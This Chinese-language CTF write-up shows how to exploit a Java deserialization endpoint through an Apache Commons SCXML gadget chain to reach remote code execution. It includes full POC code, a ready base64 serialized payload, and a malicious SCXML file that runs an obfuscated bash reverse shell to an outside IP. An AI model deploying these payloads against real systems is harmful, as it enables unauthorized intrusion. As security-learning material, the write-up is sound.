# 从一道java题体验 scxml漏洞-先知社区

> **来源**: https://xz.aliyun.com/news/16009  
> **文章ID**: 16009

---

## 前言

朋友发了我一个jar包，是一个比赛的java题，也是来看一下,以前也从来没有听说过scxml组件的漏洞，正好结合这道java题来学习一波了

## 解题

重要源码

其实就一个main

```
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

import java.io.*;
import java.net.InetSocketAddress;
import java.util.Base64;

public class Test {

    public static void main(String[] args) throws IOException {
        int port = Integer.parseInt(System.getenv().getOrDefault("PORT", "8000"));
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        server.createContext("/", new RequestHandler());
        server.start();
        System.out.printf("Server listening on :%s\n", port);
    }

    static class RequestHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String response;
            int code = 200;

            switch (exchange.getRequestURI().getPath()) {
                case "/scxml":
                    response = handleScxmlRequest(exchange);
                    break;
                default:
                    code = 404;
                    response = "Not found";
                    break;
            }

            exchange.sendResponseHeaders(code, response.length());
            try (OutputStream os = exchange.getResponseBody()) {
                os.write(response.getBytes());
            }
        }

        private String handleScxmlRequest(HttpExchange exchange) {
            String param = exchange.getRequestURI().getQuery();
            if (param == null) {
                return "No query parameter provided";
            }

            try {
                byte[] decodedBytes = Base64.getDecoder().decode(param);
                try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decodedBytes))) {
                    return ois.readObject().toString();
                }
            } catch (Throwable e) {
                e.printStackTrace();
                return ":(";
            }
        }
    }
}

```

可以看见出口就是一个反序列化，然后会调用Tostring方法，这个就很奇怪，偏偏调用Tostring，全局查找tostring方法

找到如下代码

```
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.n1ght;

import java.io.Serializable;
import java.util.Map;
import org.apache.commons.scxml2.invoke.Invoker;
import org.apache.commons.scxml2.invoke.InvokerException;

public class InvokerImpl implements Serializable {
    private final Invoker o;
    private final String source;
    private final Map params;

    public InvokerImpl(Invoker o, String source, Map params) {
        this.o = o;
        this.source = source;
        this.params = params;
    }

    public String toString() {
        try {
            this.o.invoke(this.source, this.params);
            return "success invoke";
        } catch (InvokerException var2) {
            throw new RuntimeException(var2);
        }
    }
}

```

很明显的特征了，调用任意对应的invoke方法

逻辑只能是寻找实现了invoke接口的类了

直接来到了SimpleSCXMLInvoker类

查看它的invoke方法

```
public void invoke(String source, Map<String, Object> params) throws InvokerException {
    SCXML scxml = null;

    try {
        scxml = SCXMLReader.read(new URL(source));
    } catch (ModelException var9) {
        throw new InvokerException(var9.getMessage(), var9.getCause());
    } catch (IOException var10) {
        throw new InvokerException(var10.getMessage(), var10.getCause());
    } catch (XMLStreamException var11) {
        throw new InvokerException(var11.getMessage(), var11.getCause());
    }

    Evaluator eval = this.parentSCInstance.getEvaluator();
    this.executor = new SCXMLExecutor(eval, new SimpleDispatcher(), new SimpleErrorReporter());
    Context rootCtx = eval.newContext((Context)null);
    Iterator var6 = params.entrySet().iterator();

    while(var6.hasNext()) {
        Map.Entry<String, Object> entry = (Map.Entry)var6.next();
        rootCtx.setLocal((String)entry.getKey(), entry.getValue());
    }

    this.executor.setRootContext(rootCtx);
    this.executor.setStateMachine(scxml);
    this.executor.addListener(scxml, new SimpleSCXMLListener());
    this.executor.registerInvokerClass("scxml", this.getClass());

    try {
        this.executor.go();
    } catch (ModelException var8) {
        throw new InvokerException(var8.getMessage(), var8.getCause());
    }

    if (this.executor.getCurrentStatus().isFinal()) {
        TriggerEvent te = new TriggerEvent(this.eventPrefix + invokeDone, 3);
        (new AsyncTrigger(this.parentSCInstance.getExecutor(), te)).start();
    }

}

```

观察lib

![](images/20241206121223-4b4d9c48-b388-1.png)

发现是有scxml包的，而这个依赖是有个漏洞的

参考一下这位师傅的分析<https://blog.pyn3rd.com/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/>

关键内容如下

By convention, I eventually demostrate it with the explicit PoC.

```
import org.apache.commons.scxml2.SCXMLExecutor;
import org.apache.commons.scxml2.io.SCXMLReader;
import org.apache.commons.scxml2.model.ModelException;
import org.apache.commons.scxml2.model.SCXML;

import javax.xml.stream.XMLStreamException;
import java.io.IOException;

public class SCXMLDemo {
    public static void main(String[] args) throws ModelException, XMLStreamException, IOException {

        // engine to execute the scxml instance
        SCXMLExecutor executor = new SCXMLExecutor();
        // parse SCXML URL into SCXML model
        SCXML scxml = SCXMLReader.read("http://127.0.0.1:8000/poc.xml");

        // set state machine (scxml instance) to execute
        executor.setStateMachine(scxml);
        executor.go();

    }
}
```

poc.xml

```
<?xml version="1.0"?>
<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="run">
<state id="run">
<onentry>
<script>
''.getClass().forName('java.lang.Runtime').getRuntime().exec('open -a calculator')
</script>
</onentry>
</state>
</scxml>
```

The screenshot of this illustration.

![](images/20241206121234-521b7964-b388-1.png)

就是可以加载远程的xml文件，实现命令执行

那其实答案就呼之欲出了

## 利用链构造

构造过程中有很多报错，根据报错一个一个解决就好了

首先就是SimpleSCXMLInvoker要为parentSCInstance属性赋值

```
private SCInstance parentSCInstance;

```

查看构造方法

```
void setEvaluator(Evaluator evaluator) {
    this.evaluator = evaluator;
}

```

继续查看Evaluator

有四个实现类，因为这里给了Jexl依赖

![](images/20241206121240-5598437e-b388-1.png)

选用JexlEvaluator类

```
public JexlEvaluator() {
    this.jexlEngineSilent = this.jexlEngine.isSilent();
    this.jexlEngineStrict = this.jexlEngine.isStrict();
}

```

直接构造就ok

然后就是对于params，其实不重要，只需要能够加载我的远程文件就好了

然后就是source参数就是我们的远程地址

```
http://ip:port/1.xml

```

## POC

```
import com.n1ght.InvokerImpl;
import org.apache.commons.scxml2.ErrorReporter;
import org.apache.commons.scxml2.SCInstance;
import org.apache.commons.scxml2.SCXMLExecutor;
import org.apache.commons.scxml2.env.SimpleDispatcher;
import org.apache.commons.scxml2.env.SimpleErrorReporter;
import org.apache.commons.scxml2.env.jexl.JexlEvaluator;
import org.apache.commons.scxml2.invoke.SimpleSCXMLInvoker;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class ser {
    public static void main(String[] args) throws Exception {
        ErrorReporter errorReporter = new SimpleErrorReporter();
        SimpleDispatcher simpleDispatcher = new SimpleDispatcher();
        JexlEvaluator jexlEvaluator = new JexlEvaluator();
        SCXMLExecutor scxmlExecutor = new SCXMLExecutor(jexlEvaluator, simpleDispatcher, errorReporter);
        Class<?> clazz = Class.forName("org.apache.commons.scxml2.SCInstance");
        Constructor<?> constructor = clazz.getDeclaredConstructor(SCXMLExecutor.class);
        constructor.setAccessible(true);
        SCInstance scInstance = (SCInstance) constructor.newInstance(scxmlExecutor);
        SimpleSCXMLInvoker simpleSCXMLInvoker = new SimpleSCXMLInvoker();
        setFieldValue(scInstance, "evaluator", jexlEvaluator);
        setFieldValue(simpleSCXMLInvoker, "parentSCInstance", scInstance);

        String source = "http://ip/1.xml";
        Map<String, String> params = new HashMap<>();
        params.put("username", "testUser");

        // 实例化 InvokerImpl
        InvokerImpl invokerImpl = new InvokerImpl(simpleSCXMLInvoker, source, params);

        // 序列化 InvokerImpl 并转换为 Base64
        String serializedBase64 = serializeToBase64(invokerImpl);
        System.out.println("Serialized InvokerImpl to Base64: " + serializedBase64);

        // 反序列化 InvokerImpl
        InvokerImpl deserializedInvokerImpl = deserializeFromBase64(serializedBase64);
        System.out.println("InvokerImpl deserialized successfully.");
        deserializedInvokerImpl.toString();
    }

    public static void setFieldValue(Object obj, String field, Object value) throws NoSuchFieldException, IllegalAccessException {
        Class<?> clazz = obj.getClass();
        Field fieldName = clazz.getDeclaredField(field);
        fieldName.setAccessible(true);
        fieldName.set(obj, value);
    }

    public static String serializeToBase64(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }

    public static InvokerImpl deserializeFromBase64(String base64) throws IOException, ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(base64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        return (InvokerImpl) objectInputStream.readObject();
    }
}

```

## 解题

输出的内容如下

```
rO0ABXNyABVjb20ubjFnaHQuSW52b2tlckltcGyTOSc2zqCsvwIAA0wAAW90ACpMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9pbnZva2UvSW52b2tlcjtMAAZwYXJhbXN0AA9MamF2YS91dGlsL01hcDtMAAZzb3VyY2V0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyADNvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLmludm9rZS5TaW1wbGVTQ1hNTEludm9rZXIAAAAAAAAAAQIABVoACWNhbmNlbGxlZEwAC2V2ZW50UHJlZml4cQB+AANMAAhleGVjdXRvcnQAKUxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL1NDWE1MRXhlY3V0b3I7TAAQcGFyZW50U0NJbnN0YW5jZXQAJkxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL1NDSW5zdGFuY2U7TAANcGFyZW50U3RhdGVJZHEAfgADeHAAcHBzcgAkb3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5TQ0luc3RhbmNlAAAAAAAAAAICAApMAAtjb21wbGV0aW9uc3EAfgACTAAIY29udGV4dHNxAH4AAkwACWV2YWx1YXRvcnQAJUxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0V2YWx1YXRvcjtMAAhleGVjdXRvcnEAfgAGTAAJaGlzdG9yaWVzcQB+AAJMABRpbml0aWFsU2NyaXB0Q29udGV4dHQAI0xvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0NvbnRleHQ7TAAOaW52b2tlckNsYXNzZXNxAH4AAkwACGludm9rZXJzcQB+AAJMABRub3RpZmljYXRpb25SZWdpc3RyeXQAMExvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL05vdGlmaWNhdGlvblJlZ2lzdHJ5O0wAC3Jvb3RDb250ZXh0cQB+AAt4cHNyACVqYXZhLnV0aWwuQ29sbGVjdGlvbnMkU3luY2hyb25pemVkTWFwG3P5CUtLOXsDAAJMAAFtcQB+AAJMAAVtdXRleHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4cQB+ABB4c3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgATeHNyADBvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLmVudi5qZXhsLkpleGxFdmFsdWF0b3IAAAAAAAAAAQIAAloAEGpleGxFbmdpbmVTaWxlbnRaABBqZXhsRW5naW5lU3RyaWN0eHAAAHNyACdvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLlNDWE1MRXhlY3V0b3IAAAAAAAAAAQIACFoACXN1cGVyU3RlcEwADWN1cnJlbnRTdGF0dXN0ACJMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9TdGF0dXM7TAANZXJyb3JSZXBvcnRlcnQAKUxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0Vycm9yUmVwb3J0ZXI7TAAPZXZlbnRkaXNwYXRjaGVydAArTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvRXZlbnREaXNwYXRjaGVyO0wAA2xvZ3QAIExvcmcvYXBhY2hlL2NvbW1vbnMvbG9nZ2luZy9Mb2c7TAAKc2NJbnN0YW5jZXEAfgAHTAAJc2VtYW50aWNzdAAqTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvU0NYTUxTZW1hbnRpY3M7TAAMc3RhdGVNYWNoaW5ldAAnTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvbW9kZWwvU0NYTUw7eHABc3IAIG9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuU3RhdHVzAAAAAAAAAAECAAJMAAZldmVudHN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247TAAGc3RhdGVzdAAPTGphdmEvdXRpbC9TZXQ7eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhzcgARamF2YS51dGlsLkhhc2hTZXS6RIWVlri3NAMAAHhwdwwAAAAQP0AAAAAAAAB4c3IAMW9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuZW52LlNpbXBsZUVycm9yUmVwb3J0ZXIAAAAAAAAAAQIAAUwAA2xvZ3EAfgAbeHBzcgArb3JnLmFwYWNoZS5jb21tb25zLmxvZ2dpbmcuaW1wbC5KZGsxNExvZ2dlckJmt5/gKqC8AgABTAAEbmFtZXEAfgADeHB0ADFvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLmVudi5TaW1wbGVFcnJvclJlcG9ydGVyc3IALm9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuZW52LlNpbXBsZURpc3BhdGNoZXIAAAAAAAAAAQIAAUwAA2xvZ3EAfgAbeHBzcQB+ACl0AClvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLkV2ZW50RGlzcGF0Y2hlcnNxAH4AKXQAJ29yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuU0NYTUxFeGVjdXRvcnNxAH4ACXNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AM3hzcQB+AA5zcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4cQB+ADV4cQB+ABZxAH4AHnNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AN3hwc3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgA5eHNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AO3hzcgAub3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5Ob3RpZmljYXRpb25SZWdpc3RyeQAAAAAAAAABAgABTAAEcmVnc3EAfgACeHBzcQB+AA5zcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4cQB+AD94cHNyADZvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLnNlbWFudGljcy5TQ1hNTFNlbWFudGljc0ltcGwAAAAAAAAAAQIAAkwABmFwcExvZ3EAfgAbTAAQdGFyZ2V0Q29tcGFyYXRvcnQAQExvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL3NlbWFudGljcy9UcmFuc2l0aW9uVGFyZ2V0Q29tcGFyYXRvcjt4cHNxAH4AKXQAKG9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuU0NYTUxTZW1hbnRpY3NzcgA+b3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5zZW1hbnRpY3MuVHJhbnNpdGlvblRhcmdldENvbXBhcmF0b3IAAAAAAAAAAQIAAHhwcHNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4ASHhwc3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgBKeHNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4ATHhzcQB+AD1zcQB+AA5zcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4cQB+AE94cHBzcQB+ABE/QAAAAAAADHcIAAAAEAAAAAF0AAh1c2VybmFtZXQACHRlc3RVc2VyeHQAIGh0dHA6Ly80Ny4xMDAuMjIzLjE3Mzo4MDAwLzEueG1s

```

xml内容如下

```
<?xml version="1.0"?>
<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="run">
        <state id="run">
                <onentry>
                        <script>
                                ''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjIyLjE5NS8yMzMzIDA+JjEK}|{base64,-d}|{bash,-i}')
                        </script>
                </onentry>
        </state>
</scxml>

```

![](images/20241206121249-5b2fe22e-b388-1.png)

![](images/20241206121254-5db2a9be-b388-1.png)
